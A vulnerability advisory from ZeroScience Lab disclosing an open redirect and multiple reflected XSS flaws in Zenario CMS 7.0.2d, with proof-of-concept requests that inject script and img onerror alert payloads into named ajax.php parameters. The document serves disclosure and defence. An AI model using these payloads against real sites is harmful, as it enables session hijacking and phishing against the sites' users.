@@ -1,0 +1,65 @@
+
+Zenario CMS 7.0.2d Reflected XSS and Open Redirect Vulnerabilities
+
+
+Vendor:  Tribal Ltd.
+Product web page: http://www.zenar.io
+Affected version: 7.0.2d (Community Edition)
+
+Summary: Zenario is a web-based content management system for sites
+with one or many languages. It is simple to use, and can grow with
+your requirements.
+
+Desc: Input passed via the 'location' GET parameter in 'index.php'
+script is not properly verified before being used to redirect users.
+This can be exploited to redirect a user to an arbitrary website e.g.
+when a user clicks a specially crafted link to the affected script
+hosted on a trusted domain. Zenario suffers from multiple reflected
+cross-site scripting vulnerabilities as well. The issues are triggered
+when input passed via several parameters to 'ajax.php' script is not
+properly sanitized before being returned to the user. This can be
+exploited to execute arbitrary HTML and script code in a user's browser
+session in context of an affected site.
+
+Tested on: Apache/2.4.7 (Win32)
+           PHP/5.5.6
+           MySQL 5.6.14
+
+
+Vulnerabilities discovered by Gjoko 'LiquidWorm' Krstic
+                              @zeroscience
+
+
+Advisory ID: ZSL-2014-5207
+Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2014-5207.php
+
+
+15.11.2014
+
+---
+
+
+Open Redirect:
+--------------
+Param(s): location
+===================
+
+http://192.168.1.117/zenario/zenario/admin/ie_compatibility_mode/index.php?location=http://www.zeroscience.mk
+
+
+
+Reflected XSS:
+--------------
+Param(s): cID, refiner__content_type, refiner__language, __path__, cType, cVersion, frontEnd, id, instanceId, slotName
+=======================================================================================================================
+
+GET /zenario/zenario/ajax.php?__pluginClassName__=zenario_common_features&__path__=zenario__administration/panels/backup"><script>alert(1);</script>&method_call=handleOrganizerPanelAJAX&create=11 HTTP/1.1
+GET /zenario/zenario/admin/ajax.php?_json=1&path=zenario__content/nav/content/panel&refinerId=en-us&refinerName=language&refiner__content_type=html"><img src=x onerror=alert(8)>&refiner__language=en-us&_limit=50&_start=0&_item=html_1&_sort_col=first_created_datetime&_sort_desc=0&_filters=%7B%7D HTTP/1.1
+GET /zenario/zenario/admin/ajax.php?_json=1&path=zenario__content/nav/content/panel&refinerId=en-us&refinerName=language&refiner__content_type=html&refiner__language=en-us"><img src=x onerror=alert(9)>&_limit=50&_start=0&_item=html_1&_sort_col=first_created_datetime&_sort_desc=0&_filters=%7B%7D HTTP/1.1
+POST /zenario/zenario/admin/ajax.php?_json=1&_ab=1&path=zenario_publish&id=html_1&cID=1"><img src=x onerror=alert(2)>&cType=html&cVersion=1 HTTP/1.1
+POST /zenario/zenario/admin/ajax.php?_json=1&_ab=1&path=plugin_settings&cID=1&cType=html"><img src=x onerror=alert(3)>&cVersion=1&slotName=Top_Side_2&instanceId=7&frontEnd=1 HTTP/1.1
+POST /zenario/zenario/admin/ajax.php?_json=1&_ab=1&path=plugin_settings&cID=1&cType=html&cVersion=1"><img src=x onerror=alert(4)>&slotName=Top_Side_2&instanceId=7&frontEnd=1 HTTP/1.1
+POST /zenario/zenario/admin/ajax.php?_json=1&_ab=1&path=plugin_settings&cID=1&cType=html&cVersion=1&slotName=Top_Side_2&instanceId=7&frontEnd="><img src=x onerror=alert(6)> HTTP/1.1
+POST /zenario/zenario/admin/ajax.php?_json=1&_ab=1&path=zenario_publish&id=html_190"><img src=x onerror=alert(6)>&cID=1&cType=html&cVersion=1 HTTP/1.1
+POST /zenario/zenario/admin/ajax.php?_json=1&_ab=1&path=plugin_settings&cID=1&cType=html&cVersion=1&slotName=Top_Side_2&instanceId="><img src=x onerror=alert(7)>&frontEnd=1 HTTP/1.1
+POST /zenario2/zenario/admin/ajax.php?_json=1&_ab=1&path=plugin_settings&cID=1&cType=html&cVersion=1&slotName=Top_Side_2"><img src=x onerror=alert(10)>&instanceId=7&frontEnd=1 HTTP/1.1
